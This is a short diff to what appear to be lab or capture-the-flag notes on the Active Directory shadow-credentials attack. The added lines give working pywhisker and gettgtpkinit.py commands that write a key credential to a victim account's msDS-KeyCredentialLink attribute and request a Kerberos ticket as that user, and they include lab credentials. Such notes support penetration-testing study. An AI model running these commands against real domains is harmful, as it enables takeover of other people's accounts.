@@ -120,9 +120,13 @@ In BloodHound, `AddKeyCredentialLink` means a user can write to that attribute a
 
 ```bash
 # The command below generates an `X.509 certificate` and writes the `public key` to the victim user's `msDS-KeyCredentialLink` attribute
-pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
+cd ~/tools/AD/pywhisker
+source .venv/bin/activate
+python pywhisker/pywhisker.py --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add -debug
 
 # Request TGT
+# https://github.com/dirkjanm/PKINITtools/raw/refs/heads/master/gettgtpkinit.py
+# change password from the above cmd
 python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
 ```
 
